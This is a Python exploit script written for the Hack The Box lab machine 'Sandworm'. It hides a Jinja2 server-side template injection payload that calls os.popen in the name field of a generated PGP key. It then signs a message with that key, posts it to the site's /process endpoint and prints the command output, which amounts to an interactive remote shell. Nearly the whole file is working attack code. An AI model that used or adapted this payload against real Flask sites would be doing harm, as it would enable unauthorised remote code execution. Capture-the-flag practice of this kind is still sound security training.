# Custom exploit for HTB_Sandworm 
# speeds up the creation and uploading of signed messages with pgp keys
# requires the package python-gnupg or the initial directory setting wont work

import gnupg 
import sys
import requests
from urllib.parse import urlencode, quote_plus
from bs4 import BeautifulSoup as BS


# keep the directory in tmp, this script is designed to clean up its keys and might delete others

gpg = gnupg.GPG(gnupghome="/tmp/.gnupg1")
gpg.encoding = 'utf-8'

requests.urllib3.disable_warnings()


# change these variables to desired endpoint and key password
# as per the email this specific exploit will create a new html tag with the email name

host = "https://ssa.htb/process"
password = "raccoon"
email = "a@a.com"


# generates the ssti payload with the determined format
# in this case it is for a flask site exploiting jinja2

def sstiKeyGen(command):

    sstiPayload = "{{ url_for.__globals__.os.popen('%s').read() }}" % command

    input_data = gpg.gen_key_input(name_real=sstiPayload, name_email=email, key_type="RSA", key_length=1024, passphrase=password)

    key = gpg.gen_key(input_data)
    print('Generating key')
    #print('Fingerprint: ' + str(key))

    public_key = gpg.export_keys(str(key))
    private_key = gpg.export_keys(str(key), True, passphrase=password)
    #print(public_key)

    return public_key, private_key, key


def messageSigner(privkey, key_fingerprint):

    keys = gpg.list_keys()

    try:
        i = 0
        while True:
            if str(keys[i]['fingerprint']) == str(key_fingerprint):
                keyid = keys[i]['keyid']
                #print('Keyid: %s\n' % keyid)
            i = i+1
    except:
        print('Signing message with keyid %s' % keyid)
        

    signed_data = gpg.sign(message='raccoon was here', keyid=keyid, passphrase=password)
    #print(signed_data)
    return signed_data



def sendPayload(endpoint, public_key, signed_text):

    # These are some debug values that used {{ 7*7 }} to test ssti
    #signed_text = "-----BEGIN+PGP+MESSAGE-----%0AVersion%3A+Keybase+OpenPGP+v2.0.76%0AComment%3A+https%3A%2F%2Fkeybase.io%2Fcrypto%0A%0AyL4CeJw7wsvMwMUYsS1AfzWP2FHG02ylDCnX%2FzofmsPCwMjFwMbKBOIxcHEKwJQc%0ANmH%2BK%2BWxNX3xQ0NlJunX0xhD2kJP6Kl2yHy76iDoX5dUrBfye7H83Mp3h9x3f%2FD7%0Avvv7qx8tfKq%2Fpuks69cIv3B8WYuP1H%2FXq%2BfOaORdyDc%2FVLbwpOjuP6HsuVbXfTm4%0AJ36Q7spYcEHTfGXjjLL8vwUzTi0uT3m46Kzd15c6Z9ZNPFbwfc15A%2B3lCwEEnlNV%0A%3DxFIX%0A-----END+PGP+MESSAGE-----%0A"
    #public_key = "-----BEGIN+PGP+PUBLIC+KEY+BLOCK-----%0AVersion%3A+Keybase+OpenPGP+v2.0.76%0AComment%3A+https%3A%2F%2Fkeybase.io%2Fcrypto%0A%0Axo0EZNf9NAEEAMBroloPwliXJOYxRkfmCbXH%2FKERCRbyL3G8%2Bl9towtCbb8ssnan%0Arra1lviLsDZQKUSUwxgx%2BlvqT8ONLW9rVRcUkvQm1JjF5edyH4Lef458hQi%2FUgIe%0AICmOM0SUVgf%2FWzxKoABkC0c9Lx8G%2F0zlvVu8iU8wWIOoj4Sevw8RZlxBABEBAAHN%0AE3t7IDcqNyB9fSA8YUBhLmNvbT7CugQTAQoAJAUCZNf9NAIbLwMLCQcDFQoIAh4B%0AAheAAxYCAQIZAQUJAAAAAAAKCRDb2WV%2FJSuT7M2%2FA%2F4pW5lItFeMctOZsmc3Jnpd%0AmdIkW7cYSgTuVS7tlnIwhsHrSUxTNwCoK8TAShw1QCSa%2BKs0Q8fgqxdZCl7CWMP1%0AxghC4H8HtC7Z3LBBC6jt4zT9SOJaVhEK7PDg5K2c6ICy88qPCJGA2HIUDIWzkAD4%0AkWNKg5QhLdZ8X0VRDYfp2M6NBGTX%2FTQBBADixLYS1PLWzOsTbPx43NpuP5z98thB%0AUz3D5yAb1NzG23Z8p6bDEldN55FekERUW78NO4Gc%2F9S40L%2FglBG%2F14UBRkt0B4ZF%0AYE24P9WW230MYm2QX%2BaDauflXIVwGu%2BIn8f7WZDDrvFg3bPKHV%2FaL9fyxrtmFZ41%0AoGwRaxV4pzry4wARAQABwsCDBBgBCgAPBQJk1%2F00BQkAAAAAAhsuAKgJENvZZX8l%0AK5PsnSAEGQEKAAYFAmTX%2FTQACgkQ8UUJ%2F4mjF7o9rAP%2FTrS20v4Vq94PscpSSa5S%0Av6lBGPAA4ybrqsDKlasATSd3npr%2FnGGv4a65RayvkYwwrgVAMZa2%2FUvMS4Zkcnq0%0APi6K2L02oQmLqVMzZf2BoSjmoCqg8%2FRH1c%2BVsNatZW9MoLRS3EvXKaAhVzosmZTB%0AQGXfPE6mUXRjnkCFB7b4XlNqZAP%2BIjeIMGFZl919tKRKTCGdzljC0OCQWPHDC6HS%0A1E95%2F5ATEuEgcvsQ6ra09zNXqLKdG1SJ8tGfqEePcbyzAVXTC9rVxyc%2F8iW3K3qc%0Amk6Hwg6AHc40GrvdnXJ3QQfzRbtVvd5%2BLh3J3OiMzmXxBuh1UCiDfpfjg%2BUZGYpf%0A2g%2BFsCPOjQRk1%2F00AQQAuDeFoQ%2FmBu2gpaPyUyoiJdU8VnoB0frYvbmM8E2Q82qB%0AOmcqap7GYevmfjTbosfyqH93Xu3q9yn8rGqQdZ7rT9949XWWHn6ezylsOe7o%2Fpox%0A090kXpIa7Y%2F2FAgN9x1pvKNRmnKXCP7sBu%2F6%2F1Ji9MWLYywwXcBw4nbwzj359D0A%0AEQEAAcLAgwQYAQoADwUCZNf9NAUJAAAAAAIbLgCoCRDb2WV%2FJSuT7J0gBBkBCgAG%0ABQJk1%2F00AAoJEFi2UC%2BrDBbFxCcD%2FR8I80H8fhal%2ByAmDCkuLBa2e7T1dDysR1rC%0A6ZVJPPDrJVTFVKcMt64UkrQvxXmDzGyyjrwW3KkyE877Vd55PdJ79xK8%2FC12H590%0A6y62qNd%2Be1JR1F3vc%2Fmf%2BUHLQLWdAh5a5kiBqM6oSXTrXK9HEUw54P8upPigW78w%0ADriPGUSbNdcD%2F3pIEro4BJ8pTWtzPb3%2BruynZocG8xxMObDP32oriPsiIIQnZPs4%0AWHD5IbrqVjJt%2BZIqlZos92ml8Cm54895bp4EFpf6CWejKeuOYOyo2VLd1nn%2FgSxH%0AZl51qShmgKoIXMR4%2BvFU4SjChCDCBalpsY5zUaug4om1WfTO%2FdA18kvW%0A%3DJNDH%0A-----END+PGP+PUBLIC+KEY+BLOCK-----%0A"

    rawpayload = {"signed_text":signed_text, "public_key":public_key}
    payload = urlencode(rawpayload)
    #print(payload)

    headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}

    r = requests.post(url=host, headers=headers, data=payload, verify=False)
    #print(r.text)

    return r.text


# cleans up created keys by deleting priv/pub keypair
# leverages fingerprint, if you find keys building up use fingerprint attribute to delete them

def removeKeys(key, fingerprint=None):

    if fingerprint is None:
        fp = key.fingerprint
    else:
        fp = fingerprint

    gpg.delete_keys(fp, True, passphrase=password)
    gpg.delete_keys(fp)

    activeKeys = gpg.list_keys()
    #print(activeKeys)



if __name__ == '__main__': 

    print('PGP Signed Message Automator.\nMade by CyberCherney\n')

    print('Do you want to delete all pgp keys in the directory')
    del_decision = input('Yes/N: ')

    if del_decision == 'Yes':
        print('Cleaning up keys')
        try:
            i = 0
            keys = gpg.list_keys()
            #print(keys)

            while True:
                del_fingerprint = keys[i]['fingerprint']
                removeKeys('temp', del_fingerprint)
                i=i+1
        except:
            print('Done cleaning up keys')



    while True:
        command = input('> ')
    
        pubkey, privkey, key = sstiKeyGen(command)
        #print(pubkey)
        #print(privkey)

        signed_text = messageSigner(privkey, key)
        response = sendPayload(host, pubkey, signed_text)

        removeKeys(key)
        
        soup = BS(response, features="lxml")
        elem = soup.find_all('a')

        try:
            print(elem[0])
        except:
            print('Something went wrong, the response was not as expected.')

